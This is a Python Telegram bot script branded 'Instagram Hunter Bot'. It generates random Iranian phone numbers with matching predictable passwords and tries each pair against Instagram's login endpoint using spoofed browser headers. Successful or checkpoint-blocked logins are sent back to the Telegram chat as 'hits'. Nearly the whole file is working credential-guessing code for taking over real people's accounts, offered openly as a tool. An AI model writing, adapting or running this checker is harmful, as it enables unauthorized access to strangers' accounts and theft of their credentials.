import requests
from telebot import types
import telebot
from time import sleep
import random
from torrequest import TorRequest

token = input(" [~] Enter Token : ")
bot = telebot.TeleBot(token)
r=requests.session() 
co = types.InlineKeyboardButton(text ="- Start Checker ✅",callback_data = 'check')

#----#

# باعصكم تراكوس :'/
@bot.message_handler(commands=['start'])
def start(message):
    use = message.from_user.username
    fr = message.from_user.first_name
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 2
    maac.add(co)
    bjj = message.chat.id
    bot.send_message(message.chat.id,text=f"""<strong>
Hi <code>{fr}</code>, 
- - - - - - - - - - 
Welcome to Instagram Hunter Bot! 
Now Click Start Checker! 
- - - - - - - - - - 
By  : @trprogram 
</strong>
    """,parse_mode='html',reply_to_message_id=message.message_id, reply_markup=maac)
@bot.callback_query_handler(func=lambda call: True)
def qwere(call):
    if call.data == 'check':
    	log(call.message)
    if call.data == 'gen':
        gen(call.message)
def gen():
        file = open("list.txt","r+")
        file.truncate(0)
        file.close()
        chars = '1234567890'
        for user in range(int(100)):
                    us = str(''.join((random.choice(chars) for i in range(7))))
                    user = "+98938"+ us
                    passs = "0938" + us
                    with open('list.txt', 'a+') as xx:
                        xx.write(user+':'+passs+'\n')
                        xx.close()
def log(message):
 global user, passs
 k = 0
 f = 0
 bot.send_message(message.chat.id,f"Now Started!")
 url = "https://www.instagram.com/accounts/login/ajax/"
 gen()
 #by trakos
 ll = open("list.txt","r").read().splitlines()
 for l in ll:
    user = l.split(":")[0]
    password = l.split(":")[1]
    
    headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate,br",
            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
            "content-length": "416",
            "content-type": "application/x-www-form-urlencoded",
            #trakos here
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; JKM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.46 Mobile Safari/537.36",
            "x-csrftoken": "iPbbQelxf2U4m4YMkwIEhnB0DlMAOn17",
            "x-ig-app-id": "1217981644879628",
            "x-instagram-ajax": "038693313a95",
            "x-requested-with": "XMLHttpRequest"
        }
        
    data = {"username": user, "enc_password": "#PWD_INSTAGRAM_BROWSER:0:1589682409:"+password, "queryParams": "{}",
                "optIntoOneTap": "false"}
    login = r.post(url, headers=headers, data=data, allow_redirects=True)
    if login.text.find("userId") >= 0:
        print(login.text)
        f+=1
        bot.send_message(message.chat.id,f"𝙽𝚎𝚠 𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝙷𝚒𝚝 ✅ :\n— — — — — — \n𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 :{user}\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 :{password}\n— — — — — —\n𝙱𝚢 : @trprogram") 
    elif 'checkpoint_required' in login.text:
        f+=1
        bot.send_message(message.chat.id,f"𝙽𝚎𝚠 𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝙷𝚒𝚝 ✅ :\n— — — — — — \n𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 :{user}\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 :{password}\n— — — — — —\n𝙱𝚢 : @trprogram")
    else:
        print(login.text)
        k+=1
        sleep(2)
        mees = types.InlineKeyboardMarkup(row_width=1)
        trakos = types.InlineKeyboardButton(f"- Error : {k}",callback_data='jhi')
        buut5 = types.InlineKeyboardButton(f"- On  : {user}:{password}",callback_data='jhi5')
        buut1 = types.InlineKeyboardButton(f"- Done : {f}",callback_data='jhi1')
        mees.add(trakos,buut1,buut5)
        bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="**Bot Started ✅**",parse_mode='markdown',reply_markup=mees) 
        

مرحب
